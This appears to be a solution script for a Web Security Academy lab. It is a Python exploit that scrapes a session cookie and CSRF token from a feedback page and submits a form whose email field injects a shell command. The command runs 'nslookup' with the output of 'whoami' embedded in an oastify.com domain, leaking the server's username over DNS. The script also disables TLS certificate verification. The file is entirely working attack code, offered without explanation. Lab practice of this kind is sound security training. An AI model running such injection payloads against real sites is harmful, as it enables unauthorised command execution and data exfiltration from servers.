import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from datetime import datetime


res = requests.get(
    'https://0a7b002304d6d005c2fd8f1e00b900f1.web-security-academy.net/feedback',
    verify=False,
)
soup = BeautifulSoup(res.text, 'html.parser')
session = res.cookies.get('session')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
print("session: ", session)
print("csrf: ", csrf_token)


cookies = {
    'session': session,
}

data = {
    'csrf': csrf_token,
    'name': 'a',
    'email': 'a@a.a; nslookup `whoami`.dj0o0abu85c8n2t1c8i4katb026tuji8.oastify.com ;',
    'subject': 'a',
    'message': 'a',
}

response = requests.post(
    'https://0a7b002304d6d005c2fd8f1e00b900f1.web-security-academy.net/feedback/submit',
    cookies=cookies,
    data=data,
    verify=False,
)
